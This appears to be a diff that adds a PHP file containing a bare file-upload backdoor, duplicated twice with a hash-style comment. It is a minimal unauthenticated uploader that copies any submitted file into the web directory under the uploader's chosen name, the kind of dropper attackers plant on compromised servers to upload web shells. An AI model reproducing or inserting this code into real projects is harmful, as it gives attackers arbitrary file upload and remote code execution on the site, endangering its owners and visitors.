@@ -1,0 +1,17 @@
+<?php
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>OK!!!<b><br><br>'; }
+else { echo '<b>!!!</b><br><br>'; }
+}
+/* be54aace58d583f26839a0e8cd1bf90d */
+?><?php
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>OK!!!<b><br><br>'; }
+else { echo '<b>!!!</b><br><br>'; }
+}
+/* be54aace58d583f26839a0e8cd1bf90d */
+?>
